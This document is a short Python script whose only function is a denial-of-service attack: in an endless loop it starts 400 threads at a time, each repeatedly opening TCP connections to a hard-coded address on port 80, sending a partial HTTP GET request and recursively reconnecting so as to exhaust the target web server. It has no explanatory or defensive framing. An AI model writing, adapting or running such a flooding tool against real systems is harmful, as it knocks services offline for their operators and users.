import socket
import threading
import time

ip = '192.168.0.28'
port = 80

def attack():
    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sockobj.connect((ip, port))
    except:
        attack()
    sockobj.send(b'GET / HTTP/1.1')
    time.sleep(2)
    attack()


    sockobj.close()




while True:
    for i in range(1, 400):
        t = threading.Thread(target=attack)
        try:
            t.start()
        except:
            pass
